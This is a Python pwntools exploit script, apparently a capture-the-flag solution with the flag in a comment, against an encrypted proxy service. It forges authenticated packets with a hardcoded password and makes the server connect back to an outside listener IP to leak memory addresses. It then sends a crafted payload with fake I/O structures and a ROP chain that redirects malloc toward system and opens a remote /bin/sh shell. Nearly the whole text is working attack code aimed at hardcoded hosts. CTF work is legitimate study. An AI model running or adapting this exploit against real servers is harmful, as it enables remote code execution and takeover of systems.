from pwn import *
import os, time, random, hashlib, threading
from Crypto.Cipher import AES

# rwctf{Across_the_Great_Wall_we_can_reach_every_corner_in_the_world_228f6bec172c}

password = "meiyoumima"

r = remote('54.153.22.136', 3343)
host = '54.153.22.136'
ip = '149.28.204.92'

r.recvuntil('bind at ')
port = int(r.recvline().strip())

MAX_CONN = 5
conn = [remote(host, port) for _ in xrange(MAX_CONN)]

def pack(data, rand):
    timestamp = p64(int(time.time()))
    nonce = p64(random.random() * 1000)
    token = hashlib.sha256(password + timestamp + nonce).digest()[:16]
    kv = hashlib.sha256(password + token).digest()
    cipher = AES.new(key=kv[:16], IV=kv[16:], mode=AES.MODE_CBC)
    meta = timestamp + nonce + p8(1) + p32((len(data) + len(rand) + 80) & 0xffffffff) + p8(len(rand)) + '\x00' * 10
    checksum = hashlib.sha256(token + meta + '\x00' * 32 + str(data) + rand).digest()
    return token + cipher.encrypt(meta + checksum + str(data)) + rand

def packx():
    timestamp = p64(int(time.time()))
    nonce = p64(random.random() * 1000)
    token = hashlib.sha256(password + timestamp + nonce).digest()[:16]
    kv = hashlib.sha256(password + token).digest()
    cipher = AES.new(key=kv[:16], IV=kv[16:], mode=AES.MODE_CBC)
    return token + cipher.encrypt(timestamp + nonce + p8(1) + p32(79) + p8(0) +
            '\x00' * 10 + '\x00' * 32)

leak = '\x01\x01\x03' + p8(len(ip)) + ip + p16(54321)[::-1]
leak = leak.ljust(0x1e0 - 1) + '\x80'

leaked = []

def listener():
    l = listen(54321)
    _ = l.wait_for_connection()
    d = l.recvuntil(chr(0x80))
    d = l.recvn(0x80)
    leaked.append(d)

th = threading.Thread(target=listener)
th.start()

dead = [MAX_CONN - 2 - i for i in xrange(2)]
for x in dead:
    conn[x].close()

conn[0].send(pack(leak, ''))

th.join()
d = leaked[0]
text_base = u64(d[0x30:0x38]) - 0x39793
heap_base = u64(d[0x10:0x18]) - 0x9cc30
magic = text_base + 0xA1C1

text_base = u64(d[0x30:0x38]) - 0x396d1
heap_base = u64(d[0x10:0x18]) - 0x1b0f0
enc_data = heap_base + 0x1ee10
rax = enc_data + 0xb20
magic = text_base + 0xA0FF
print 'text: %#x' % (text_base)
print 'heap: %#x' % (heap_base)
print hexdump(d)

conn[1].send(packx())
prev = enc_data + 0x40
io = enc_data + 0x80
io2 = enc_data + 0x100
buf = enc_data + 0x140
rop = enc_data + 0x200
rop -= 0xa80
rop2 = enc_data + 0x400
payload = bytearray('A' * 0xb20)
payload[:8] = p64(magic)
payload[0x48:0x50] = p64(1) # prev->closed
payload[0x88:0x8c] = p32(1) # fd = 1
payload[0x8c] = 0 # not closed
payload[0x90:0x94] = p32(0x1001)
payload[0x98:0xa0] = p64(buf)
payload[0x140:0x148] = p64(rop)
payload[0x148:0x150] = p64(rop + 0x1001)
payload[0x108:0x10c] = p32(0) # fd = 0
payload[0x10c] = 0 # not closed
payload[0x110:0x114] = p32(0)
payload += p64(enc_data) + p64(prev) + p64(io)

pop_rdi = text_base + 0x3c5a3
pop_rsi_rbp = text_base + 0x17737
pop_rdx_std_dec_rcx = text_base + 0x3199f
pop_rcx_mov_edi_dec_ecx = text_base + 0x110f3
pop_rcx_cld_jmp_qword_rdx = text_base + 0x43541
pop_rsp_rbp = text_base + 0x7b3f
pop_rax = text_base + 0x47ab0
malloc_got = text_base + 0x258E58
aio_write = text_base + 0x7680
aio_read = text_base + 0x75F0
memcpy = text_base + 0x72D0
ptrdiff = 0x47c30 # malloc - system
sub = text_base + 0x287ff # sub    DWORD PTR [rcx-0x1],esi; call   QWORD PTR [rax+0x4855c3c9]

payload[8:0x10] = p64(pop_rax)
payload[0x10:0x18] = p64(pop_rax + 1)
cmd = '/bin/sh\x00'
payload[0x20:len(cmd) + 0x20] = cmd
ropchain = ''.join(map(p64, [
    pop_rdx_std_dec_rcx, 0x8,
    pop_rsi_rbp, malloc_got, 0x1234,
    pop_rdi, rop2,
    memcpy,
    pop_rdx_std_dec_rcx, enc_data + 0x10,
    pop_rcx_cld_jmp_qword_rdx, rop2 + 1,
    pop_rsi_rbp, ptrdiff, 0x4321,
    pop_rax, (enc_data + 8) - 0x4855c3c9,
    sub,
    pop_rdi, enc_data + 0x20,
    pop_rsp_rbp, rop2 - 8,
    ]))

payload[0x200:0x200+len(ropchain)] = ropchain

conn[1].send(str(payload))

r.interactive()
